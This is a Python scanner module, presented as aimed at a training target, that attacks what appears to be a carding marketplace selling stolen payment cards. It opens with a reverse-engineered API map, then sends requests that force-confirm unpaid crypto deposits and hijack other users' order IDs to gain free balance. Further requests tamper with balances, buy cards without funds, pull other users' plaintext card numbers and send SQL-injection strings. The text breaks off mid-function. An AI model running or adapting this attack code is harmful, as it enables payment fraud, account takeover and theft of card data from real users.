"""
Crypto Payment / Balance Bypass Scanner
Tuned for EC-Council CVV HUB training target

Source-analysed from: /components/js/allinone.js (1094 lines, fully read)
OWASP A1:2021  - Broken Access Control
OWASP A3:2021  - Injection / Business Logic
CWE-840: Business Logic Errors
CWE-362: Race Condition
CWE-639: IDOR

=======================================================================
FULL API MAP  (reverse-engineered from allinone.js)
=======================================================================

AUTH
  POST /login.php?login
       fields: username, password, mcaptcha__token, mcaptcha_token
       response: '5'=success, '3'=no account, '0'=IP ratelimit, '1'=user ratelimit
  POST /login.php?register=<captcha>
       response JSON: {register:'ok'|'closed'|'captchafail', username, password}
  GET  /info.php?logout

BALANCE
  GET  /info.php?get_balance   -> plain-text dollar amount (e.g. "0,91")

PAYMENT / DEPOSIT
  GET  /money_add.php?type=<1-5>   -> JSON {type, details, error}
       type 5 = USDT (min $50 USDT), others = crypto coins
       error='noadr' -> no wallet address assigned yet
  GET  /money_view.php?get_history=<1>  -> JSON array:
       [{id, date, type, details, balance, status}, ...]
       status: 'opened'->'wait payment', 'confirmed'->'received'
  GET  /money_view.php?check_order=<id>  -> '1'=received / '0'=wait
       *** HIGH VALUE IDOR: force-confirm any order by ID ***
  GET  /money_view.php?rtid=<id>&service=order  -> ticket creation

CARDS - BROWSE & BUY
  POST /cc_buy.php?category|country|state|city|brand|type|level
       fields: addrex, phone, email, selltype, cvv, category, country,
               brand, type, level, bin, state, city, zip
  POST /cc_buy.php?cards   (+ page, perpage, bank, selleruse)
       response[0].lock='1' -> query-limit active
  POST /cc_buy.php?buy_one   field: cardid=<id>
       response: 3=success, 2=low balance, 0=error
  GET  /cc_buy.php?get_card_data=<id>  -> JSON [{data:'<card_plaintext>'}]

BASKET
  POST /cc_basket.php?to_cart          field: cardid=<id>
       response: 0=already-in-cart, 1=added, 2=sold
  POST /cc_basket.php?add_to_cart_bulk fields: id[]=<id>&id[]=<id>...
  GET  /cc_basket.php?cart_count       -> plain int
  GET  /cc_basket.php?cart_card_list   -> JSON array
  GET  /cc_basket.php?get_cart_price   -> plain dollar amount
  POST /cc_basket.php?del_card         field: id=<cardid>
  GET  /cc_basket.php?clear_cart
  GET  /cc_basket.php?buy
       response: '1'=no cards, '2'=low balance, '3'=bought, ''/'7'=error

PURCHASED CARDS
  GET  /cc_list.php?seecc=<cid>            -> reveal card (marks as seen)
  GET  /cc_list.php?get_card=<cid>         -> JSON card details
  GET  /cc_list.php?to_check=<id>          -> submit for validity check
  GET  /cc_list.php?to_check_daycc=<daycc>
  GET  /cc_list.php?get_daycc=<daycc>      -> JSON array of cards for that day
  GET  /cc_list.php?rtid=<id>&service=card -> ticket creation
  item fields: id, data, hide, ch_st, fst, refund, resqueid
  ch_st: 0=unchecked,1=checking,2=rechecking,3=done
  fst: 0=pending,1=good,2=bad,3=refund,4=bad,5=timesup,6/7=fiftycode,8-10=error,11=refund

OTHER
  POST /bin_search.php?bininfo   field: data=<bin_numbers>
  POST /ch_password.php          field: current_pass=<pass>
       response JSON: {status:1, new:<newpass>}  -- auto-generates new password!
  GET  /check3ds/<id>            (inferred from card buttons in JS)
=======================================================================
"""

import re
import threading
from urllib.parse import urljoin

from .base import BaseScanner, Finding


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _fake_txid(length: int = 64) -> str:
    import random
    return "".join(random.choices("0123456789abcdef", k=length))


FAKE_TXIDS = [
    _fake_txid(64),
    _fake_txid(64),
    "0" * 64,
    "f" * 64,
    "a" * 64,
    "1" * 64,
]

# Payment type IDs discovered from allinone.js (type 5 = USDT, min $50)
PAYMENT_TYPES = [1, 2, 3, 4, 5, 6, 7, 0, -1, 999]

# Exact endpoints from allinone.js
SITE_ENDPOINTS = {
    # Auth
    "login":        "/login.php?login",
    "register":     "/login.php",
    "logout":       "/info.php?logout",
    "balance":      "/info.php?get_balance",
    # Payment
    "money_add":    "/money_add.php",
    "money_view":   "/money_view.php",
    # Cards
    "cc_buy":       "/cc_buy.php",
    "cc_basket":    "/cc_basket.php",
    "cc_list":      "/cc_list.php",
    "cc_list_arc":  "/cc_list_arc.php",
    # Other
    "r_card":       "/r_card.php",
    "ssndob":       "/ssndob.php",
    "bin_search":   "/bin_search.php",
    "ch_password":  "/ch_password.php",
    "cc_by_bin":    "/card/cc_by_bin.php",
    "allinone_js":  "/components/js/allinone.js",
}


class PaymentBypassScanner(BaseScanner):
    """
    Business-logic / payment bypass scanner for EC-Council CVV HUB training target.
    All endpoints and parameter names sourced directly from allinone.js.
    """

    def scan(self) -> list[Finding]:
        findings = []
        base = self.target.rstrip("/")

        money_add_url   = base + SITE_ENDPOINTS["money_add"]
        money_view_url  = base + SITE_ENDPOINTS["money_view"]
        cc_basket_url   = base + SITE_ENDPOINTS["cc_basket"]
        cc_buy_url      = base + SITE_ENDPOINTS["cc_buy"]
        cc_list_url     = base + SITE_ENDPOINTS["cc_list"]
        balance_url     = base + SITE_ENDPOINTS["balance"]
        ch_password_url = base + SITE_ENDPOINTS["ch_password"]

        baseline_balance = self._get_balance(balance_url)
        self.logger.info(f"[payment] Baseline balance: {baseline_balance}")

        findings += self._test_payment_type_enumeration(money_add_url)
        findings += self._test_check_order_idor(money_view_url, money_add_url)
        findings += self._test_fake_txid_submission(money_add_url)
        findings += self._test_amount_tampering_via_type(money_add_url)
        findings += self._test_direct_balance_endpoint(balance_url)
        findings += self._test_quick_buy_low_balance(cc_buy_url)
        findings += self._test_basket_buy_no_balance(cc_basket_url)
        findings += self._test_bulk_cart_manipulation(cc_basket_url)
        findings += self._test_idor_money_view(money_view_url)
        findings += self._test_idor_cards(cc_list_url)
        findings += self._test_idor_get_card_data(cc_buy_url)
        findings += self._test_password_change_no_verify(ch_password_url)
        findings += self._test_race_condition(money_view_url, money_add_url)
        findings += self._audit_allinone_js(base + SITE_ENDPOINTS["allinone_js"])
        findings += self._test_session_fixation()

        # Detect if any test actually changed the balance
        new_balance = self._get_balance(balance_url)
        if new_balance and baseline_balance and new_balance != baseline_balance:
            findings.append(Finding(
                title="Balance Changed During Security Test",
                severity="CRITICAL",
                owasp="A1:2021",
                cwe="CWE-840",
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                url=balance_url,
                parameter="balance",
                payload=f"before={baseline_balance} after={new_balance}",
                description=(
                    "Account balance changed during security testing, indicating a "
                    "payment bypass or business logic vulnerability was triggered."
                ),
                impact="Attacker can credit balance without a legitimate crypto deposit.",
                remediation=(
                    "Investigate which test triggered the balance change. "
                    "Ensure balance is updated ONLY via server-side blockchain confirmations."
                ),
                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                evidence=f"Balance changed: '{baseline_balance}' -> '{new_balance}'",
                confirmed=True,
                vuln_type="Business Logic / Payment Bypass",
            ))

        return findings

    # -----------------------------------------------------------------------
    # HELPER
    # -----------------------------------------------------------------------

    def _get_balance(self, balance_url: str) -> str | None:
        """GET /info.php?get_balance -> plain text (e.g. '0,91')"""
        try:
            resp = self.http.get(balance_url)
            if resp and resp.status_code == 200:
                return resp.text.strip()
        except Exception:
            pass
        return None

    # -----------------------------------------------------------------------
    # TEST 1: Payment type enumeration
    # GET /money_add.php?type=<N>
    # type 5 = USDT (min $50). Types 6/7/0/-1/999 are undocumented.
    # -----------------------------------------------------------------------

    def _test_payment_type_enumeration(self, url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing payment type enumeration...")

        for ptype in PAYMENT_TYPES:
            try:
                resp = self.http.get(f"{url}?type={ptype}")
                if not resp:
                    continue
                try:
                    data = resp.json()
                except Exception:
                    data = {}

                # Wallet address returned for unexpected type = potential bypass
                if data.get("details") and ptype not in range(1, 6):
                    findings.append(Finding(
                        title=f"Unexpected Payment Type Accepted: type={ptype}",
                        severity="MEDIUM",
                        owasp="A1:2021",
                        cwe="CWE-840",
                        cvss_score=6.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
                        url=f"{url}?type={ptype}",
                        parameter="type",
                        payload=str(ptype),
                        description=(
                            f"money_add.php accepted type={ptype} and returned a wallet "
                            f"address ({data.get('details','')[:30]}). Only types 1-5 are "
                            "expected per the JS source."
                        ),
                        impact="Undefined payment types may bypass deposit validation logic.",
                        remediation="Whitelist only valid type IDs server-side. Reject all others.",
                        references=["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"],
                        evidence=f"type={ptype} -> {resp.status_code}: {resp.text[:300]}",
                        confirmed=True,
                        vuln_type="Business Logic",
                    ))
            except Exception as e:
                self.logger.debug(f"[payment] type={ptype} error: {e}")

        return findings

    # -----------------------------------------------------------------------
    # TEST 2 (HIGHEST PRIORITY): check_order IDOR
    # GET /money_view.php?check_order=<id>
    # From allinone.js line 1019-1029:
    #   result==='1' -> alert('payment received') -> get_history()
    # If this endpoint triggers balance crediting, probing other users'
    # confirmed order IDs would credit OUR account for free.
    # -----------------------------------------------------------------------

    def _test_check_order_idor(self, money_view_url: str, money_add_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing check_order IDOR (highest priority)...")

        existing_ids = set()
        own_order_id = None

        # Get current order history to know our own IDs
        try:
            hist = self.http.get(f"{money_view_url}?get_history=1")
            if hist and hist.status_code == 200:
                try:
                    for item in hist.json():
                        if item.get("id"):
                            existing_ids.add(str(item["id"]))
                    if existing_ids:
                        own_order_id = max(existing_ids, key=lambda x: int(x) if x.isdigit() else 0)
                        self.logger.info(f"[payment] Existing order IDs: {sorted(existing_ids)}")
                except Exception:
                    pass
        except Exception as e:
            self.logger.debug(f"[payment] get_history error: {e}")

        # Create a fresh payment order (GET /money_add.php?type=1)
        try:
            cr = self.http.get(f"{money_add_url}?type=1")
            if cr and cr.status_code == 200:
                hist2 = self.http.get(f"{money_view_url}?get_history=1")
                if hist2 and hist2.status_code == 200:
                    try:
                        new_ids = {str(i["id"]) for i in hist2.json() if i.get("id")}
                        fresh = new_ids - existing_ids
                        if fresh:
                            own_order_id = max(fresh, key=lambda x: int(x) if x.isdigit() else 0)
                            self.logger.info(f"[payment] New order ID: {own_order_id}")
                        existing_ids = new_ids
                    except Exception:
                        pass
        except Exception as e:
            self.logger.debug(f"[payment] create order error: {e}")

        # Attempt to force-confirm our OWN order (no real deposit)
        if own_order_id:
            try:
                r = self.http.get(f"{money_view_url}?check_order={own_order_id}")
                if r and r.text.strip() == "1":
                    findings.append(Finding(
                        title="Payment Order Force-Confirmed via check_order (CRITICAL)",
                        severity="CRITICAL",
                        owasp="A1:2021",
                        cwe="CWE-840",
                        cvss_score=10.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
                        url=f"{money_view_url}?check_order={own_order_id}",
                        parameter="check_order",
                        payload=str(own_order_id),
                        description=(
                            f"GET /money_view.php?check_order={own_order_id} returned '1' "
                            "(payment received) with NO actual crypto deposit made. "
                            "allinone.js shows this triggers 'payment received' and refreshes "
                            "transaction history, meaning balance is credited server-side."
                        ),
                        impact="Unlimited free balance credit without any cryptocurrency deposit.",
                        remediation=(
                            "NEVER allow client-initiated order confirmation. "
                            "Balance must ONLY be credited via server-side webhook from payment "
                            "processor after cryptographic blockchain verification. "
                            "check_order must be strictly read-only."
                        ),
                        references=[
                            "https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html",
                        ],
                        evidence=f"GET check_order={own_order_id} -> '1' (expected '0' for no deposit)",
                        confirmed=True,
                        vuln_type="Business Logic / Payment Bypass",
                    ))
            except Exception as e:
                self.logger.debug(f"[payment] check_order own error: {e}")

        # IDOR: probe other users' sequential order IDs
        probe_ids = []
        if own_order_id and str(own_order_id).isdigit():
            base_id = int(own_order_id)
            probe_ids = [base_id - i for i in range(1, 5)] + \
                        [base_id + i for i in range(1, 5)] + \
                        [1, 2, 3, 100, 1000]
        else:
            probe_ids = list(range(1, 16)) + [100, 500, 1000]

        confirmed_idor = []
        for oid in probe_ids:
            if str(oid) == str(own_order_id):
                continue
            try:
                r = self.http.get(f"{money_view_url}?check_order={oid}")
                if r and r.status_code == 200:
                    val = r.text.strip()
                    if val in ("0", "1"):
                        confirmed_idor.append({"id": oid, "status": val})
                        if val == "1":
                            findings.append(Finding(
                                title=f"IDOR: check_order Triggered on Another User's Confirmed Order (id={oid})",
                                severity="CRITICAL",
                                owasp="A1:2021",
                                cwe="CWE-639",
                                cvss_score=9.8,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
                                url=f"{money_view_url}?check_order={oid}",
                                parameter="check_order (IDOR)",
                                payload=str(oid),
                                description=(
                                    f"check_order with another user's confirmed order ID ({oid}) "
                                    "returned '1'. If this credits balance, an attacker steals "
                                    "credit from any confirmed deposit in the system."
                                ),
                                impact="Unlimited balance inflation using other users' legitimate deposits.",
                                remediation=(
                                    "Bind order IDs to user session. Verify ownership before status check. "
                                    "Use UUIDs instead of sequential integers for order IDs."
                                ),
                                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                                evidence=f"GET check_order={oid} (different user) -> '1' (confirmed)",
                                confirmed=True,
                                vuln_type="IDOR / Payment Bypass",
                            ))
            except Exception:
                pass

        if confirmed_idor:
            findings.append(Finding(
                title="IDOR: Cross-User Order ID Enumeration via check_order",
                severity="HIGH",
                owasp="A1:2021",
                cwe="CWE-639",
                cvss_score=7.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
                url=f"{money_view_url}?check_order=<id>",
                parameter="check_order",
                payload=", ".join(str(x["id"]) for x in confirmed_idor),
                description=(
                    f"Sequential order IDs are accessible without ownership check. "
                    f"Found {len(confirmed_idor)} accessible cross-user orders: "
                    f"{[x['id'] for x in confirmed_idor]}."
                ),
                impact="Payment order metadata exposure; potential balance manipulation.",
                remediation="Add server-side ownership validation on all order endpoints.",
                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                evidence=f"Probed {len(probe_ids)} IDs, found {len(confirmed_idor)} accessible",
                confirmed=True,
                vuln_type="IDOR",
            ))

        return findings

    # -----------------------------------------------------------------------
    # TEST 3: Fake transaction hash submission
    # -----------------------------------------------------------------------

    def _test_fake_txid_submission(self, url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing fake txid submission...")

        txid_params = ["txid", "tx", "txhash", "transaction_id", "hash",
                       "tx_hash", "transaction", "confirm", "txn_id"]

        for txid in FAKE_TXIDS[:3]:
            for param in txid_params:
                try:
                    test_url = f"{url}?type=1&{param}={txid}"
                    r = self.http.get(test_url)
                    if r and r.status_code == 200:
                        if any(kw in r.text.lower() for kw in
                               ["success", "confirmed", "received", "credit", "balance", "added"]):
                            findings.append(Finding(
                                title="Fake Transaction Hash Accepted by Payment Endpoint",
                                severity="CRITICAL",
                                owasp="A3:2021",
                                cwe="CWE-840",
                                cvss_score=9.8,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                url=test_url,
                                parameter=param,
                                payload=txid[:20] + "...",
                                description=(
                                    f"Payment endpoint accepted fake hash via '{param}' "
                                    "and returned a success keyword."
                                ),
                                impact="Credit balance using fabricated blockchain transaction hash.",
                                remediation="Never accept txids from client. Verify via server-side blockchain API only.",
                                references=["https://owasp.org/www-project-top-ten/2021/A03_2021-Injection"],
                                evidence=f"GET {param}={txid[:16]}... -> {r.status_code}: {r.text[:200]}",
                                confirmed=True,
                                vuln_type="Payment Bypass",
                            ))
                            break
                except Exception:
                    pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 4: Amount parameter injection alongside type
    # -----------------------------------------------------------------------

    def _test_amount_tampering_via_type(self, url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing amount parameter injection...")

        payloads = [
            {"amount": "9999", "type": "5"},
            {"amount": "0.01", "type": "1"},
            {"amount": "-100", "type": "1"},
            {"balance": "9999", "type": "1"},
            {"credit": "9999", "type": "1"},
            {"deposit": "9999", "type": "1"},
            {"usd": "9999",    "type": "1"},
            {"value": "9999",  "type": "1"},
        ]

        for payload in payloads:
            try:
                qs = "&".join(f"{k}={v}" for k, v in payload.items())
                r = self.http.get(f"{url}?{qs}")
                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if data.get("details") and \
                                any(k in payload for k in ("amount", "balance", "credit")):
                            findings.append(Finding(
                                title="Client-Supplied Amount Parameter Accepted by Payment Endpoint",
                                severity="MEDIUM",
                                owasp="A1:2021",
                                cwe="CWE-840",
                                cvss_score=5.0,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:M/A:N",
                                url=f"{url}?{qs}",
                                parameter=list(payload.keys())[0],
                                payload=str(payload),
                                description=(
                                    "Extra amount/balance/credit param was accepted and a wallet "
                                    "address was returned. Server may process client-supplied amounts."
                                ),
                                impact="Potential deposit amount manipulation.",
                                remediation="Ignore all client-supplied amount params. Amount set by blockchain.",
                                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                                evidence=f"GET {qs} -> {r.status_code}: {r.text[:300]}",
                                confirmed=False,
                                vuln_type="Parameter Tampering",
                            ))
                    except Exception:
                        pass
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 5: Direct balance endpoint manipulation
    # /info.php is the balance endpoint — test write-like params
    # -----------------------------------------------------------------------

    def _test_direct_balance_endpoint(self, balance_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing direct balance endpoint manipulation...")

        base = balance_url.replace("?get_balance", "")
        test_params = [
            "set_balance=9999", "add_balance=100", "update_balance=9999",
            "balance=9999", "get_balance=9999", "deposit=100", "credit=100",
        ]

        for param in test_params:
            try:
                r = self.http.get(f"{base}?{param}")
                if r and r.status_code == 200 and r.text.strip():
                    val = r.text.strip()
                    if re.match(r"^[\d,\.]+$", val) and val not in ("0", "0.00", "0,00"):
                        findings.append(Finding(
                            title=f"Direct Balance Manipulation via /info.php?{param.split('=')[0]}",
                            severity="CRITICAL",
                            owasp="A1:2021",
                            cwe="CWE-840",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
                            url=f"{base}?{param}",
                            parameter=param.split("=")[0],
                            payload=param,
                            description=f"/info.php responded to '{param}' with balance value '{val}'.",
                            impact="Full account balance manipulation without payment.",
                            remediation="/info.php must only accept ?get_balance (read-only). All writes are server-triggered.",
                            references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                            evidence=f"GET /info.php?{param} -> {r.status_code}: '{val}'",
                            confirmed=True,
                            vuln_type="Direct Balance Manipulation",
                        ))
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 6: Quick buy with insufficient/zero balance
    # POST /cc_buy.php?buy_one  field: cardid=<id>
    # From JS: response 3=success, 2=low balance, 0=error
    # -----------------------------------------------------------------------

    def _test_quick_buy_low_balance(self, cc_buy_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing quick buy manipulation...")

        test_ids = [1, 2, 3, 0, -1, "' OR '1'='1", "../", 999999]

        for card_id in test_ids:
            try:
                r = self.http.post(f"{cc_buy_url}?buy_one",
                                   data={"cardid": str(card_id)})
                if r and r.status_code == 200 and r.text.strip() == "3":
                    findings.append(Finding(
                        title=f"Quick Buy Succeeded Without Sufficient Balance (cardid={card_id})",
                        severity="CRITICAL",
                        owasp="A1:2021",
                        cwe="CWE-840",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                        url=f"{cc_buy_url}?buy_one",
                        parameter="cardid",
                        payload=str(card_id),
                        description=(
                            f"Quick buy returned '3' (success) for cardid={card_id} "
                            "despite insufficient or zero balance."
                        ),
                        impact="Free card purchase; complete business logic bypass.",
                        remediation="Verify balance server-side before processing purchase. Use atomic DB transactions.",
                        references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                        evidence=f"POST buy_one cardid={card_id} -> '3' (bought)",
                        confirmed=True,
                        vuln_type="Business Logic / Free Purchase",
                    ))
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 7: Basket buy with low/no balance
    # GET /cc_basket.php?buy
    # From JS: '1'=no cards, '2'=low balance, '3'=bought
    # -----------------------------------------------------------------------

    def _test_basket_buy_no_balance(self, cc_basket_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing basket buy...")

        try:
            price_resp = self.http.get(f"{cc_basket_url}?get_cart_price")
            cart_price = price_resp.text.strip() if price_resp else "unknown"

            buy_resp = self.http.get(f"{cc_basket_url}?buy")
            if buy_resp and buy_resp.text.strip() == "3":
                findings.append(Finding(
                    title="Basket Purchase Succeeded Without Sufficient Balance",
                    severity="CRITICAL",
                    owasp="A1:2021",
                    cwe="CWE-840",
                    cvss_score=9.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                    url=f"{cc_basket_url}?buy",
                    parameter="buy",
                    payload="GET /cc_basket.php?buy",
                    description=(
                        f"Cart purchase returned '3' (bought) without sufficient balance. "
                        f"Cart price was: {cart_price}"
                    ),
                    impact="Complete purchase bypass; free card acquisition.",
                    remediation="Verify balance >= cart total server-side inside a DB transaction.",
                    references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                    evidence=f"GET /cc_basket.php?buy -> '3' (cart_price={cart_price})",
                    confirmed=True,
                    vuln_type="Business Logic / Free Purchase",
                ))
        except Exception as e:
            self.logger.debug(f"[payment] basket buy error: {e}")

        return findings

    # -----------------------------------------------------------------------
    # TEST 8: Bulk cart manipulation — duplicate card IDs
    # POST /cc_basket.php?add_to_cart_bulk  fields: id[]=<id>...
    # -----------------------------------------------------------------------

    def _test_bulk_cart_manipulation(self, cc_basket_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing bulk cart manipulation...")

        test_card_id = 1
        bulk_data = "&".join(f"id[]={test_card_id}" for _ in range(20))

        try:
            r = self.http.post(
                f"{cc_basket_url}?add_to_cart_bulk",
                data=bulk_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if r and r.status_code == 200:
                try:
                    result = r.json()
                    added = sum(1 for v in result.values() if str(v) == "1") \
                            if isinstance(result, dict) else 0
                    if added > 1:
                        findings.append(Finding(
                            title="Duplicate Card Added to Basket via Bulk Endpoint",
                            severity="MEDIUM",
                            owasp="A1:2021",
                            cwe="CWE-840",
                            cvss_score=5.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:M/A:N",
                            url=f"{cc_basket_url}?add_to_cart_bulk",
                            parameter="id[]",
                            payload=f"id[]={test_card_id} (x20)",
                            description=(
                                f"Bulk add-to-cart allowed card ID {test_card_id} to be "
                                f"added {added} times in one request."
                            ),
                            impact="Cart price manipulation; potential free/discounted purchases.",
                            remediation="Deduplicate card IDs server-side. Limit bulk operations.",
                            references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                            evidence=f"Sent id[]={test_card_id} x20, got {added} 'added' responses",
                            confirmed=True,
                            vuln_type="Business Logic",
                        ))
                except Exception:
                    pass
        except Exception as e:
            self.logger.debug(f"[payment] bulk cart error: {e}")

        return findings

    # -----------------------------------------------------------------------
    # TEST 9: IDOR on transaction history
    # GET /money_view.php?get_history=<type>
    # -----------------------------------------------------------------------

    def _test_idor_money_view(self, money_view_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing IDOR on transaction history...")

        try:
            own_resp = self.http.get(f"{money_view_url}?get_history=1")
            own_data, own_ids = [], set()
            if own_resp and own_resp.status_code == 200:
                try:
                    own_data = own_resp.json()
                    own_ids = {str(i.get("id")) for i in own_data if i.get("id")}
                except Exception:
                    pass

            for htype in [0, 2, 3, 9, 99, "all", "'", "1 OR 1=1"]:
                try:
                    r = self.http.get(f"{money_view_url}?get_history={htype}")
                    if r and r.status_code == 200 and len(r.text) > 10:
                        data = r.json()
                        other_ids = {str(i.get("id")) for i in data if i.get("id")}
                        new_ids = other_ids - own_ids
                        if new_ids and len(data) > len(own_data):
                            findings.append(Finding(
                                title=f"IDOR: get_history type={htype} Returns Other Users' Transactions",
                                severity="HIGH",
                                owasp="A1:2021",
                                cwe="CWE-639",
                                cvss_score=7.5,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
                                url=f"{money_view_url}?get_history={htype}",
                                parameter="get_history",
                                payload=str(htype),
                                description=(
                                    f"History endpoint returned {len(new_ids)} additional "
                                    f"records not belonging to the current user (type={htype})."
                                ),
                                impact="Exposure of other users' payment history and wallet addresses.",
                                remediation="Filter all queries by authenticated user ID server-side.",
                                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                                evidence=f"type=1->{len(own_ids)} records; type={htype}->{len(other_ids)} records",
                                confirmed=True,
                                vuln_type="IDOR",
                            ))
                except Exception:
                    pass
        except Exception as e:
            self.logger.debug(f"[payment] idor money_view error: {e}")

        return findings

    # -----------------------------------------------------------------------
    # TEST 10: IDOR on purchased cards
    # GET /cc_list.php?get_card=<cid>
    # -----------------------------------------------------------------------

    def _test_idor_cards(self, cc_list_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing IDOR on purchased card list...")

        for card_id in range(1, 10):
            try:
                r = self.http.get(f"{cc_list_url}?get_card={card_id}")
                if r and r.status_code == 200 and len(r.text) > 5:
                    data = r.json()
                    if data and isinstance(data, list) and data[0].get("data"):
                        findings.append(Finding(
                            title=f"IDOR: Unauthorized Access to Purchased Card Data (id={card_id})",
                            severity="CRITICAL",
                            owasp="A1:2021",
                            cwe="CWE-639",
                            cvss_score=9.1,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                            url=f"{cc_list_url}?get_card={card_id}",
                            parameter="get_card",
                            payload=str(card_id),
                            description=(
                                f"/cc_list.php?get_card={card_id} returned card data "
                                "belonging to another user without ownership check."
                            ),
                            impact="Full exposure of another user's payment card data.",
                            remediation="Verify card ownership against authenticated session before returning data.",
                            references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                            evidence=f"GET get_card={card_id} -> {r.text[:200]}",
                            confirmed=True,
                            vuln_type="IDOR / Data Exposure",
                        ))
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 11: IDOR on cc_buy.php?get_card_data=<id>
    # Called after quick_buy — returns plaintext card. Can we call for any ID?
    # -----------------------------------------------------------------------

    def _test_idor_get_card_data(self, cc_buy_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing IDOR on get_card_data...")

        for card_id in range(1, 8):
            try:
                r = self.http.get(f"{cc_buy_url}?get_card_data={card_id}")
                if r and r.status_code == 200 and len(r.text) > 5:
                    data = r.json()
                    if data and isinstance(data, list) and data[0].get("data"):
                        card_data = data[0]["data"]
                        if re.search(r"\d{13,19}", card_data):
                            findings.append(Finding(
                                title=f"IDOR: Unauthorized Card Data via get_card_data (id={card_id})",
                                severity="CRITICAL",
                                owasp="A1:2021",
                                cwe="CWE-639",
                                cvss_score=9.8,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                url=f"{cc_buy_url}?get_card_data={card_id}",
                                parameter="get_card_data",
                                payload=str(card_id),
                                description=(
                                    f"/cc_buy.php?get_card_data={card_id} returned payment card "
                                    "plaintext without verifying purchase ownership."
                                ),
                                impact="Mass unauthorized acquisition of PAN/card data.",
                                remediation="Check card purchase ownership in session before returning card data.",
                                references=["https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control"],
                                evidence=f"GET get_card_data={card_id} -> {card_data[:50]}...",
                                confirmed=True,
                                vuln_type="IDOR / PAN Data Exposure",
                            ))
            except Exception:
                pass

        return findings

    # -----------------------------------------------------------------------
    # TEST 12: Password change without knowing current password
    # POST /ch_password.php  field: current_pass=<pass>
    # From JS line 1058-1081: result.status===1 -> shows auto-generated new password!
    # -----------------------------------------------------------------------

    def _test_password_change_no_verify(self, ch_password_url: str) -> list[Finding]:
        findings = []
        self.logger.info("[payment] Testing password change without verification...")

        payloads = [
            {"current_pass": ""},
            {"current_pass": "' OR '1'='1"},
            {"current_pass": "wrongpassword_xyz999"},
            {"current_pass": " "},
            {},
        ]

        for payload in payloads:
            try:
                r = self.http.post(ch_password_url, data=payload)
                if r and r.status_code == 200:
                    data = r.json()
                    if data.get("status") == 1 and data.get("new"):
                        findings.append(Finding(
                            title="Password Changed Without Valid Current Password Verification",
                            severity="CRITICAL",
                            owasp="A7:2021",
                            cwe="CWE-620",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            url=ch_password_url,
                            parameter="current_pass",
                            payload=str(payload),
                            description=(
                                f"Password change endpoint accepted {payload} and returned "
                                "a new password without verifying the current one."
                            ),
                            impact="Any authenticated session can change account password without knowing it.",
                            remediation=(
                                "Always require and cryptographically verify current password. "
                                "Rate-limit. Log all changes."
                            ),
                            references=["https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures"],
                            evidence=(
                                f"POST current_pass={payload.get('current_pass','<empty>')} "
